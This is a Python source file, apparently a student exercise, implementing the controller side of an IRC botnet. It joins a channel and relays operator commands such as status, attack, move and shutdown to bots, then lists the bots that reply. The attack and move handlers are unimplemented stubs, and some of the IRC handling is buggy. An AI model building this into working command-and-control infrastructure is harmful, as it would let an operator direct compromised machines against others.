import argparse
import sys
import socket
import time
from termios import tcflush, TCIFLUSH

class Controller_Client:
    def __init__(self, host, port, channel, secret_phrase):
        self.host = host
        self.port = port
        self.channel = "#" + channel
        self.secret_phrase = secret_phrase
        self.nick = "controller"
        self.irc_socket = None
        self.controller = None
        self.controller_nick = None
        self.attack_counter = 0

    def start_client(self):
        connected = self.__attempt_connection()
        if connected:
            self.send_to_channel("testy")
        while connected:
            text = self.get_text()
            self.log(text)
            # prompt user to enter a command and execute it
            command = self.__prompt_command()
            self.__send_command(command)

        self.irc_socket.close()
    
    # prompts the user to enter input in order to execute command
    def __prompt_command(self):
        tcflush(sys.stdin, TCIFLUSH) # flush input buffer while command was being tested
        return input("Please enter the command you wish to execute: ").strip()

    #TODO define functionality for each command 
    def __send_command(self, command):
        self.send_to_channel(command)
        timeout = 5 # timeout (in seconds)
        timeout_start = time.time()
        self.log("Waiting for responses...")
        while time.time() < timeout_start + timeout:
            pass
        response = self.get_text() # get response from bots
        self.log("bot response: " + response)
        self.log("done")

        # check if msg is a DM
        if ("PRIVMSG" in response) and (self.channel not in response):
            self.__parse_response(command, response)
    
    def __parse_response(self, command, response):
        response_dict = {}
        for line in response.strip().split('\n'):
            # self.log("LINE:  " + line)
            # get the sender's ID
            sender = line.split(':')[1].split(' ')[0].split('!')[0]
            # get the message sent by the sender
            message = line.split(' :')[1].strip()
            response_dict[sender] = message

        if command == "status":
            bot_list = []
            for sender in response_dict:
                bot_list.append(sender)
            self.log("Found " + str(len(bot_list)) + " bots: " + ", ".join(bot_list))
            return True
        if command.startswith("attack "):
            return True
        if command.startswith("move "):
            return True
        elif command == "quit":
            self.__terminate()
            return True
        elif command == "shutdown":
            return True
        else:
            return False

            
    # Closes connection and terminates controller
    def __terminate(self):
        self.log("Terminating...")
        self.irc_socket.close()
        sys.exit()

    # Code adapted from: https://pythonspot.com/en/building-an-irc-bot/
    def get_text(self):
        print("right before recv")
        text = self.recv_msg() #receive the text
        if text.find('PING') != -1:
            self.send_msg('PONG ' + text.split()[1] + 'rn')
        return text
    
    def __attempt_connection(self):
        connected = False
        timeout = 5 # timeout (in seconds)
        timeout_start = time.time()
        while not connected and (time.time() < timeout_start + timeout):
            connected = self.__connect()
        if not connected:
            self.log("Error: Connection to Host: " + self.host + \
                     " on Port: " + str(self.port) + " timed out.")
        return connected

    def __connect(self):
        self.irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.irc_socket.connect((self.host, self.port))  # connect to server
        except Exception:
            return False

        self.send_msg("USER "+ "test" +" "+ self.nick +" "+ self.nick + \
        " :\n") # user authentication
        self.send_msg("NICK "+ self.nick+"\n") # sets nick
        self.send_msg("JOIN "+ self.channel +"\n") # join the channel
        return True

    # function for logging messages
    def log(self, message):
        print(message.strip("\n") + "\n")

    # functions to send/recv raw messages from IRC server
    def send_msg(self, message):
        self.irc_socket.send(message.encode())

    def recv_msg(self):
        self.irc_socket.settimeout(1.0)
        try:
            data = self.irc_socket.recv(2040).decode()  #receive the text
        except socket.timeout:
            return ""
        return data 

    # functions to send/recv messages to channel
    def send_to_channel(self, message):
        self.send_msg("PRIVMSG " + self.channel + " :" + message + "\n")

    def send_to_user(self, nick, message):
        self.send_msg("PRIVMSG " + nick + " :" + message + "\n")


# function to check if port is valid
def check_port(port):
    try:
        port = int(port)
    except ValueError:
        return False
    if port >= 0 and port <= 65535:
        return True
    else:
        return False

# argparse function to handle user input
# Reference: https://docs.python.org/3.6/howto/argparse.html
# define a string to hold the usage error msg
def parse_arguments():
    usage_string = ("conbot.py <host> <port> <channel> <secret-phrase>")
    parser = argparse.ArgumentParser(usage=usage_string)

    parser.add_argument("host",
                        help="Specifies the address of the server",
                        type=str)
    parser.add_argument("port",
                        help="Specifies the port on which the server is listening. "
                        "Port in integer range 0-65535",
                        type=int)
    parser.add_argument("channel",
                        help="IRC channel to join",
                        type=str)
    parser.add_argument("secret_phrase",
                        help="A secret text required to connect",
                        type=str)
    args = parser.parse_args()

    # check that port is in a valid range
    if not check_port(args.port):
        parser.exit("usage: " + usage_string)

    return args


def main():
    args = parse_arguments()
    # launch the client
    controller_client = Controller_Client(args.host, args.port, args.channel,
                                          args.secret_phrase)
    controller_client.start_client()
if __name__ == '__main__':
    main()
